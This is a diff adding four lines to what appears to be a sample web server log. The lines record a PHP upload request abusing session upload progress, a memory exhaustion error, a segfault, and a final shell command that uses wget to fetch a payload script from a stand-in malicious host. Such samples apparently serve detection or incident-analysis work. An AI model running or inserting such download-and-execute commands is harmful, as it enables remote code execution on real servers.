@@ -1,0 +1,4 @@
+[2026-10-23T09:10:44Z] POST /upload.php boundary=B7kQpoc618_upload_progress PHP_SESSION_UPLOAD_PROGRESS=test PHPSESSID=abcdefghijklmnopqrstuvwx
+[2026-10-23T09:10:44Z] PHP Fatal error: Allowed memory size of 134217728 bytes exhausted (tried to allocate 65536 bytes)
+[2026-10-23T09:10:45Z] [core:notice] AH00051: child pid 4517 exit signal Segmentation fault (11)
+[2026-10-23T09:10:45Z] sh -c wget http://malicious.example/payload.sh
